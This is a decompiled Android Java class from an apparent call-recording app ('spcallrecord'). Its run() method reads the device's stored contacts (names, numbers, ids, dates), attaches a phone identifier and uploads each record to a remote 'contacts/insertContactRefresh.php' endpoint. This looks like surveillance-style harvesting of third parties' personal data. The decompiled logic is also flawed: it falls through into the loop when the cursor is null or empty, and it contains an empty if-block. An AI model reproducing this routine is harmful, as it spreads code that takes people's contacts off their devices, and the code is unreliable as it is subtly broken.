package com.yasoka.spcallrecord.recorder.call.a.c.i;

import a.c.b.C0093z;
import a.c.b.P;
import a.c.e.a;
import a.c.e.e;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import com.app.service.UploadDataService;
import com.crashlytics.android.Crashlytics;
import java.util.HashMap;
import java.util.Map;

/* compiled from: SendContact */
public class g implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f272b;

    /* renamed from: a reason: collision with root package name */
    private final Context f273a;

    public g(Context context) {
        this.f273a = context;
    }

    private void a() {
        try {
            UploadDataService.b();
            StringBuilder sb = new StringBuilder();
            sb.append("UploadDataService.getmNbTask() : ");
            sb.append(UploadDataService.f1272b);
            sb.toString();
            if (UploadDataService.f1272b <= 0) {
                this.f273a.stopService(new Intent(this.f273a, UploadDataService.class));
            }
        } catch (Throwable th) {
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }

    /* JADX WARNING: Exception block dominator not found, dom blocks: [] */
    /* JADX WARNING: Missing exception handler attribute for start block: B:28:0x0105 */
    /* JADX WARNING: Removed duplicated region for block: B:23:0x00f8 A[Catch:{ Exception -> 0x00fe }] */
    public synchronized void run() {
        try {
            if (f272b) {
                a();
                return;
            }
            f272b = true;
            P p = new P(this.f273a);
            p.b();
            Cursor c2 = p.c();
            if (c2 == null || c2.getCount() <= 0 || !c2.moveToFirst()) {
                p.a();
                if (c2 != null) {
                    c2.close();
                }
                f272b = false;
                a();
            }
            do {
                C0093z zVar = new C0093z();
                zVar.a(c2.getInt(0));
                zVar.c(c2.getString(1));
                zVar.d(c2.getString(2));
                zVar.b(c2.getString(3));
                zVar.a(c2.getString(4));
                HashMap hashMap = new HashMap();
                StringBuilder sb = new StringBuilder();
                sb.append("");
                sb.append(e.e(this.f273a));
                hashMap.put("idPhone", sb.toString());
                StringBuilder sb2 = new StringBuilder();
                sb2.append("");
                sb2.append(zVar.d());
                hashMap.put("name", sb2.toString());
                StringBuilder sb3 = new StringBuilder();
                sb3.append("");
                sb3.append(zVar.e());
                hashMap.put("number", sb3.toString());
                StringBuilder sb4 = new StringBuilder();
                sb4.append("");
                sb4.append(zVar.c());
                hashMap.put("idContact", sb4.toString());
                StringBuilder sb5 = new StringBuilder();
                sb5.append("");
                sb5.append(zVar.a());
                hashMap.put("date", sb5.toString());
                if (a.b("contacts/insertContactRefresh.php", (Map<String, String>) hashMap)) {
                    p.a(zVar.b());
                }
            } while (c2.moveToNext());
            p.a();
            if (c2 != null) {
            }
            f272b = false;
            a();
        } catch (Exception e2) {
            e2.getStackTrace();
            Crashlytics.logException(e2);
        }
    }
}
